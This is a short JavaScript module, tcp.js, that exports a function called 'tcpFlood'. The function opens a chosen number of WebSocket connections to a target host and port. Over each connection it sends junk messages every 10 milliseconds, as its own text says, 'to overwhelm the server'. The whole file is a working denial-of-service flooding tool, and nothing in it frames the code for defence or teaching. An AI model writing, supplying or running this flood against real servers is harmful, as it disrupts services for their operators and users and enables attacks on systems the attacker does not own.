// tcp.js
function tcpFlood(target, threads) {
  if (!target) {
    console.error("Target URL is required for TCP flood.");
    return;
  }

  if (!threads || threads <= 0) {
    threads = 1;
  }

  const url = new URL(target);
  const hostname = url.hostname;
  const port = url.port || 80;

  for (let i = 0; i < threads; i++) {
    try {
      const socket = new WebSocket(`ws://${hostname}:${port}`);

      socket.onopen = () => {
        setInterval(() => {
          try {
            socket.send("TCP Flood: Sending junk data to overwhelm the server.");
          } catch (e) {
            socket.close();
          }
        }, 10);
      };

      socket.onerror = (error) => {
        console.error("WebSocket error:", error);
      };

      socket.onclose = () => {
        console.log("WebSocket connection closed.");
      };
    } catch (e) {
      console.error("Error creating WebSocket:", e);
    }
  }
}

export { tcpFlood };